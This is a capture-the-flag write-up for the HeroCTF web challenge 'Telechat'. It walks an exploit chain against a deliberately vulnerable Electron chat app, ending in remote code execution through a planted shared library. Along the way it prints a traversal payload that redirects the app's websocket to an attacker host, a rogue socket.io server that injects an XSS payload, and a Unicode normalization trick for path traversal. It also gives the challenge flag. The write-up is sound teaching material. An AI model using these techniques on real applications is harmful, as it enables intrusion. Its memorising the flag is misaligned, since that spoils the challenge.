# Telechat

### Category

Web

### Description

Telechat is a revolutionary electron application that lets you talk live with AIs. Need help? Report it to our superior AI, who'll take care of it - no more humans, no more problems ?
PS: You will find enclosed with this challenge an explanatory note for deployment.

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**

Author : **Worty**

### Write Up

This challenge involves an electron application and a nodejs backend server, the goal is to execute `/getflag` in order to get the flag.

The electron application is basically an interface with multiple options, players can start a conversation with "AI bot" or "Report bot". When a conversation is opened with a "Report bot", players must send an uuid corresponding a conversation to be review by the bot. Moreover, all protections are activated and nodeIntegration is set to false.

In this challenge, players and the bot are using the same electron application, the unique difference is that the bot is launching the application with the environment variable `BOT_REVIEW=1` that active one special code in the electron application that permit to reviews conversations between "AIs" and players. If this env variable is set, the following code will be run:
```js
window.electron.activate_check((res) => {
    if(res) {
        setInterval(function(){
            window.electron.check((data) => {
                createConversation("BOT REVIEW", data);
            });
        },1000) 
    }
})
```

First thing we can notice in the electron application is how messages are displayed :

```js
function renderMessages() {
    if (!currentConversation) return;
    messagesDiv.innerHTML = '';
    currentConversation.messages.forEach(msg => {
        const msgDiv = document.createElement('div');
        msgDiv.className = 'message-bubble';
        msgDiv.innerHTML = msg.message;

        if (msg.bot) {
            msgDiv.classList.add('bot-message');
        } else {
            msgDiv.classList.add('user-message');
        }

        messagesDiv.appendChild(msgDiv);
    });
}
```

The famous `.innerHTML` is used, so there is a self-xss here, because messages are sanitized by the backend before being resend :

```js
function sanitize(str) {
    return str.replace(/[^a-zA-Z0-9]/g, '');
}
[...]
await db.run('INSERT INTO messages (message, conv_id) VALUES (?, ?)', sanitize(message), conv_id);
[...]
```

Second thing we can notice is that, when someone try to send a uuid to report, the client is checking that it matchs a uuid regex :

```js
const uuidRegex = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
[...]
function sendMessage() {
    if (currentConversation && messageInput.value) {
        if(currentConversation.report == 1 && !uuidRegex.test(messageInput.value)) {
            alert("You must provide here the conversation UUID you want to report.");
            return;
        } else {
            socket.emit('message', {uuid: currentConversation.id, message: messageInput.value, report: currentConversation.report});
        }

        currentConversation.messages.push({bot: 0, message: messageInput.value});
        messageInput.value = '';
        renderMessages();
    }
}
```

If we check on the server-side, there isn't any checks :

```js
[...]
io_user.on('connection', (socket) => {
    socket.on('message', async ({ report, uuid, message }) => {
        if (report == 1) {
            socket.emit('response', 'We are reviewing your report...');
            spawnSync("xdg-open",[`telechat://review/${message}`]);
            socket.emit('response', 'Our analysis is finished, thank you for reporting.');
        } else {
          [...]
        }
    });
});
```

A malicious user can therefore craft a special python script that will interact with the socket.io server and send string that do not correspond to uuids.

But how the bot is reviewing conversations ? When a deep-link is triggered (telechat://) the following code will be run :

```js
//preload.js
[...]
ipcRenderer.on('deeplink', (_, url) => {
    let content = url.split("telechat://")[1];
    let action = content.split("/")[0];
    if(action == "review") {
        uuid_reported = content.split("review/")[1];
    }
});

contextBridge.exposeInMainWorld('electron', {
    api_url: process.env.API_URL,
    check: (callback) => {
        if(uuid_reported != "") {
            callback(uuid_reported);
            uuid_reported = "";
        }
    },
    activate_check: (callback) => {
        callback(process.env.BOT_REVIEW);
    }
});
[...]
```

```js
//renderer.js
function createConversation(name, conv_uuid = undefined) {
  [...]
  if(name !== "BOT REVIEW") {
        conversation["report"] = is_report;
    } else {
        currentConversation = conversation;
        let socket_bot = io(window.electron.api_url,{
            path: "/reviews/"+conv_uuid+"/"
        });
        socket_bot.on('response', (data) => {
            if(data !== undefined) {
                if(data !== "END REVIEW") {
                    let current_message = data.split(": ");
                    if(current_message[0] == "USER"){
                        currentConversation.messages.push({bot: 0, message: current_message[1]})
                    } else {
                        currentConversation.messages.push({bot: 1, message: current_message[1]})
                    }
                } else {
                    currentConversation.messages.push({bot: 1, message: "<button id='download' onclick='screenshot()'>Download conversation screenshot</button>"});
                }
            }
        });
        conversation["report"] = conv_uuid;
    }
}
```

But as describe above, a malicious user can send whatever he wants as conversation uuid, therefore, we have a Client-Side Path Traversal on the socket.io opener.

What can we do with a path traversal in the socket.io opener ? A lot of things ! 

In fact (for the node.js implementation), socket.io does not follow the RFC and is using a library that follows redirects (https://www.npmjs.com/package/xmlhttprequest) :

```js
// https://github.com/driverdan/node-XMLHttpRequest/blob/master/lib/XMLHttpRequest.js#L409
 if (response.statusCode === 301 || response.statusCode === 302 || response.statusCode === 303 || response.statusCode === 307) {
    [...]
    request = doRequest(newOptions, responseHandler).on("error", errorHandler);
    request.end();
 }
```

This is really bad, because if we manage to redirect socket.io to another socket.io server (called rogue socket.io server for now), we can force our victim to discuss with us and not with the legitimate server.

In the backend source code, we can observe that the following middleware is executed on each GET HTTP request :

```js
[...]
const whitelist_get_params = ["EIO", "transport", "t", "sid"];

const server = http.createServer((req, res) => {
    let parsed_url = url.parse(req.url, true);
    let authorize_url = true;
    for (const key in parsed_url.query){
        if (!whitelist_get_params.includes(key)) {
            authorize_url = false;
            parsed_url.search = "";
            delete parsed_url.query[key]
        }
    }
    if(!authorize_url) {
        res.writeHead(307, { Location: parsed_url.format()});
        res.end();
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end("[DEBUG] - Wrong socket.io endpoint.");
    }
});
```

This means that if a GET request comes to the server with another parameter than the whitelist, the server will redirect the user to the actual path without the forbidden parameter, example :

```
GET /?data=a HTTP/1.1
[...]

HTTP/1.1 307 Temporary Redirect
Location: /
```

But, if a request comes with two slashes (for example //heroctf.fr), the server will act as follow :

```
GET //heroctf.fr?data=a HTTP/1.1
[...]

HTTP/1.1 307 Temporary Redirect
Location: //heroctf.fr
```

In javascript, `//` is considered as the actual scheme (http or https), so we have here an open redirect ! A malicious user can therefore report the following conversation to trigger the open redirect : `123e4567-e89b-12d3-a456-426614174000/../..//heroctf.fr/?data=a`.

In order for socket.io to connect to the rogue socket.io server, the open redirect must contain the `EIO` GET parameter, and the full path to the socket.io endpoint : `123e4567-e89b-12d3-a456-426614174000/../..//attacker.fr/socket.io/?EIO=4&data=a`

Previously, we see that the client was trusting the backend server because message were sanitize, but as we now act as an evil rogue server, we can send messages that contains XSS :

```js
const http = require('http');
const socketIo = require('socket.io');

const server = http.createServer();
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

io.on('connection', (socket) => {
    console.log('Victim connected');
    socket.emit('response',`USER: <img src=x onerror='alert(1)'>`);
});

const port = 4444;

server.listen(port, "0.0.0.0", () => {
    console.log(`Rogue socket.io server listening on http://0.0.0.0:${port}`);
});

```

Now that we have javascript code execution on the bot, we must found a way to gain remote code execution. As said before, all protections are activated and the process is sandboxed, if we observe the `main.js` file of the electron application, we can see that the download feature is overwrriten :

```js
[...]
const ses = session.defaultSession;

ses.on('will-download', (_, item, __) => {
    let filePath = path.join(app.getPath('downloads'), Math.random().toString(36).substring(2, 15), item.getFilename());
    filePath = path.normalize(Buffer.from(filePath, "ascii").toString());
    item.setSavePath(filePath);
});
[...]
```

The application is creating a random folder to download files, but an interesting thing is that the path is converted to ascii format. In fact, we are looking here for a path traversal vulnerability, but if we force a download (through the XSS) of a filename called `../../../../../../../tmp/test`, the function `getFilename()` will return `.._.._.._.._.._.._.._tmp_test`. We can abuse the ascii conversion to find a character that, after normalization, is replaced by `/`. A little script to automatize this process :

```js
for(var i=0; i<65535; i++){
    if(Buffer.from(String.fromCharCode(i), "ascii").toString() == "/"){
        console.log(i);
    }
}
```

We can observe that a lot of characters match our requirements, for example : `į` will be normalize to `/`.

Great, we can now write a file wherever we want, but how can we gain remote code execution from that ? In the instructions given with the challenge, we can see that the remote instance is running on `Ubuntu 22.04 x64`, so we can set up a vm matching this. After that, if we run the `Telechat` application with strace, we can see that the application tries to load several shared libraries, and some of them does not exist, for example `libX11-xcb.so.1`. Therefore, we can write to `/proc/self/cwd/` (so we don't have to guess the application path), our evil shared library !

To resume, the exploit chain is the following :
- Bypass of uuid filtering in the report conversation
- Client side path traversal on socket.io opener
- Websocket flow hijack to a rogue web server
- XSS to force download of arbitrary files
- Abuse of normalization leading to path traversal on download feature
- Remote code execution on shared library loading

You can see solves scripts in the `solve/` folder !


### Flag

HERO{3ee899a3a64fa1078b57ec3fcc6718da}
